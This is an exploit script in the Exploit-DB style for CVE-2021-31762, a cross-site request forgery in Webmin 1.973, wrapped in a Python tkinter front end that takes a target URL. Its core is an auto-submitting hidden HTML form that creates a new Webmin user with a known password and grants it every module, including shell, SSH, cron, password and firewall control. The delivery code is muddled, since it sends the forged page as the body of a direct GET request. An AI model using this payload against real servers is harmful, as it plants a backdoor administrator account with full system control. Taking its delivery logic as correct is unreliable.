# Exploit Title: Webmin 1.973 - 'save_user.cgi' Cross-Site Request Forgery (CSRF)
# Date: 24/04/2021
# Exploit Author: *Mesh3l_911 & Z0ldyck
# Vendor Homepage: https://www.webmin.com
# Repo Link: https://github.com/Mesh3l911/CVE-2021-31762
# Version: Webmin 1.973
# Tested on: All versions <= 1.973
# CVE : CVE-2021-31762
# POC: https://youtu.be/qCvEXwyaF5U

import requests
import time, subprocess
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def Webmin():
    root = tkinter.Tk()
    root.title("CVE-2021-31762 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        target = inp
        scroll_y = Scrollbar(root, orient=VERTICAL)
        txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
        scroll_y.pack(side=RIGHT, fill=Y)
        scroll_y.config(command=txtarea.yview)
        header= {
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/json',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-site',
        'TE': 'trailers'
        }
        POC = '''query=
        <html>
                <head>
                    <meta name="referrer" content="never">
                </head>
          <body>
          <script>history.pushState('', '', '/')</script>
            <form action="'''+target+'''" method="POST">
              <input type="hidden" name="safe" value="" />
              <input type="hidden" name="name" value="Mesh3l&#95;Z0ldyck" />
              <input type="hidden" name="pass&#95;def" value="0" />
              <input type="hidden" name="pass" value="Mesh3l&#95;Z0ldyck123" />
              <input type="hidden" name="real" value="Mesh3l&#95;Z0ldyck" />
              <input type="hidden" name="cert&#95;def" value="1" />
              <input type="hidden" name="lang&#95;def" value="1" />
              <input type="hidden" name="lang" value="af" />
              <input type="hidden" name="notabs" value="0" />
              <input type="hidden" name="theme&#95;def" value="1" />
              <input type="hidden" name="theme" value="" />
              <input type="hidden" name="overlay&#95;def" value="1" />
              <input type="hidden" name="overlay" value="overlay&#45;theme" />
              <input type="hidden" name="logouttime&#95;def" value="1" />
              <input type="hidden" name="minsize&#95;def" value="1" />
              <input type="hidden" name="ipmode" value="0" />
              <input type="hidden" name="ips" value="" />
              <input type="hidden" name="days&#95;def" value="1" />
              <input type="hidden" name="hours&#95;def" value="1" />
              <input type="hidden" name="hours&#95;hfrom" value="" />
              <input type="hidden" name="hours&#95;mfrom" value="" />
              <input type="hidden" name="hours&#95;hto" value="" />
              <input type="hidden" name="hours&#95;mto" value="" />
              <input type="hidden" name="mod" value="backup&#45;config" />
              <input type="hidden" name="mod" value="change&#45;user" />
              <input type="hidden" name="mod" value="webmincron" />
              <input type="hidden" name="mod" value="usermin" />
              <input type="hidden" name="mod" value="webminlog" />
              <input type="hidden" name="mod" value="webmin" />
              <input type="hidden" name="mod" value="help" />
              <input type="hidden" name="mod" value="servers" />
              <input type="hidden" name="mod" value="acl" />
              <input type="hidden" name="mod" value="bacula&#45;backup" />
              <input type="hidden" name="mod" value="init" />
              <input type="hidden" name="mod" value="passwd" />
              <input type="hidden" name="mod" value="quota" />
              <input type="hidden" name="mod" value="mount" />
              <input type="hidden" name="mod" value="fsdump" />
              <input type="hidden" name="mod" value="ldap&#45;client" />
              <input type="hidden" name="mod" value="ldap&#45;useradmin" />
              <input type="hidden" name="mod" value="logrotate" />
              <input type="hidden" name="mod" value="mailcap" />
              <input type="hidden" name="mod" value="mon" />
              <input type="hidden" name="mod" value="pam" />
              <input type="hidden" name="mod" value="certmgr" />
              <input type="hidden" name="mod" value="proc" />
              <input type="hidden" name="mod" value="at" />
              <input type="hidden" name="mod" value="cron" />
              <input type="hidden" name="mod" value="sentry" />
              <input type="hidden" name="mod" value="man" />
              <input type="hidden" name="mod" value="syslog" />
              <input type="hidden" name="mod" value="syslog&#45;ng" />
              <input type="hidden" name="mod" value="system&#45;status" />
              <input type="hidden" name="mod" value="useradmin" />
              <input type="hidden" name="mod" value="apache" />
              <input type="hidden" name="mod" value="bind8" />
              <input type="hidden" name="mod" value="pserver" />
              <input type="hidden" name="mod" value="dhcpd" />
              <input type="hidden" name="mod" value="dhcp&#45;dns" />
              <input type="hidden" name="mod" value="dovecot" />
              <input type="hidden" name="mod" value="exim" />
              <input type="hidden" name="mod" value="fetchmail" />
              <input type="hidden" name="mod" value="foobar" />
              <input type="hidden" name="mod" value="frox" />
              <input type="hidden" name="mod" value="jabber" />
              <input type="hidden" name="mod" value="ldap&#45;server" />
              <input type="hidden" name="mod" value="majordomo" />
              <input type="hidden" name="mod" value="htpasswd&#45;file" />
              <input type="hidden" name="mod" value="minecraft" />
              <input type="hidden" name="mod" value="mysql" />
              <input type="hidden" name="mod" value="openslp" />
              <input type="hidden" name="mod" value="postfix" />
              <input type="hidden" name="mod" value="postgresql" />
              <input type="hidden" name="mod" value="proftpd" />
              <input type="hidden" name="mod" value="procmail" />
              <input type="hidden" name="mod" value="qmailadmin" />
              <input type="hidden" name="mod" value="mailboxes" />
              <input type="hidden" name="mod" value="sshd" />
              <input type="hidden" name="mod" value="samba" />
              <input type="hidden" name="mod" value="sendmail" />
              <input type="hidden" name="mod" value="spam" />
              <input type="hidden" name="mod" value="squid" />
              <input type="hidden" name="mod" value="sarg" />
              <input type="hidden" name="mod" value="wuftpd" />
              <input type="hidden" name="mod" value="webalizer" />
              <input type="hidden" name="mod" value="link" />
              <input type="hidden" name="mod" value="adsl&#45;client" />
              <input type="hidden" name="mod" value="bandwidth" />
              <input type="hidden" name="mod" value="fail2ban" />
              <input type="hidden" name="mod" value="firewalld" />
              <input type="hidden" name="mod" value="ipsec" />
              <input type="hidden" name="mod" value="krb5" />
              <input type="hidden" name="mod" value="firewall" />
              <input type="hidden" name="mod" value="firewall6" />
              <input type="hidden" name="mod" value="exports" />
              <input type="hidden" name="mod" value="exports&#45;nfs4" />
              <input type="hidden" name="mod" value="xinetd" />
              <input type="hidden" name="mod" value="inetd" />
              <input type="hidden" name="mod" value="pap" />
              <input type="hidden" name="mod" value="ppp&#45;client" />
              <input type="hidden" name="mod" value="pptp&#45;client" />
              <input type="hidden" name="mod" value="pptp&#45;server" />
              <input type="hidden" name="mod" value="stunnel" />
              <input type="hidden" name="mod" value="shorewall" />
              <input type="hidden" name="mod" value="shorewall6" />
              <input type="hidden" name="mod" value="itsecur&#45;firewall" />
              <input type="hidden" name="mod" value="tcpwrappers" />
              <input type="hidden" name="mod" value="idmapd" />
              <input type="hidden" name="mod" value="filter" />
              <input type="hidden" name="mod" value="burner" />
              <input type="hidden" name="mod" value="grub" />
              <input type="hidden" name="mod" value="lilo" />
              <input type="hidden" name="mod" value="raid" />
              <input type="hidden" name="mod" value="lvm" />
              <input type="hidden" name="mod" value="fdisk" />
              <input type="hidden" name="mod" value="lpadmin" />
              <input type="hidden" name="mod" value="smart&#45;status" />
              <input type="hidden" name="mod" value="time" />
              <input type="hidden" name="mod" value="vgetty" />
              <input type="hidden" name="mod" value="iscsi&#45;client" />
              <input type="hidden" name="mod" value="iscsi&#45;server" />
              <input type="hidden" name="mod" value="iscsi&#45;tgtd" />
              <input type="hidden" name="mod" value="iscsi&#45;target" />
              <input type="hidden" name="mod" value="cluster&#45;passwd" />
              <input type="hidden" name="mod" value="cluster&#45;copy" />
              <input type="hidden" name="mod" value="cluster&#45;cron" />
              <input type="hidden" name="mod" value="cluster&#45;shell" />
              <input type="hidden" name="mod" value="cluster&#45;shutdown" />
              <input type="hidden" name="mod" value="cluster&#45;usermin" />
              <input type="hidden" name="mod" value="cluster&#45;useradmin" />
              <input type="hidden" name="mod" value="cluster&#45;webmin" />
              <input type="hidden" name="mod" value="cfengine" />
              <input type="hidden" name="mod" value="heartbeat" />
              <input type="hidden" name="mod" value="shell" />
              <input type="hidden" name="mod" value="custom" />
              <input type="hidden" name="mod" value="disk&#45;usage" />
              <input type="hidden" name="mod" value="export&#45;test" />
              <input type="hidden" name="mod" value="ftelnet" />
              <input type="hidden" name="mod" value="filemin" />
              <input type="hidden" name="mod" value="flashterm" />
              <input type="hidden" name="mod" value="tunnel" />
              <input type="hidden" name="mod" value="file" />
              <input type="hidden" name="mod" value="phpini" />
              <input type="hidden" name="mod" value="cpan" />
              <input type="hidden" name="mod" value="htaccess&#45;htpasswd" />
              <input type="hidden" name="mod" value="telnet" />
              <input type="hidden" name="mod" value="ssh" />
              <input type="hidden" name="mod" value="ssh2" />
              <input type="hidden" name="mod" value="shellinabox" />
              <input type="hidden" name="mod" value="status" />
              <input type="hidden" name="mod" value="ajaxterm" />
              <input type="hidden" name="mod" value="updown" />
              <input type="hidden" name="mod" value="vnc" />
              <input type="submit" value="Submit request" />
            </form>
            <script>
              document.forms[0].submit();
            </script>
          </body>
        </html>'''
        r2 = requests.get(target,headers=header,data=POC)
        txtarea.insert(END, "Status Code:")
        txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")
        txtarea.insert(END, r2)
        txtarea.insert(END, "\n\n\n")
        txtarea.insert(END, "Response headers:")
        txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")
        txtarea.insert(END, r2.headers)
        txtarea.insert(END, "\n\n\n")
        txtarea.insert(END, "Response:")
        txtarea.insert(END, "\n----------------------------------------------------------------------------------\n")
        txtarea.insert(END, r2.text)
        txtarea.pack(fill=BOTH, expand=True)
        txtarea.configure(state ='disabled')
    Hacher = Label(root, text="Enter url or domin https://www.example.com/api/v3 : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()
    

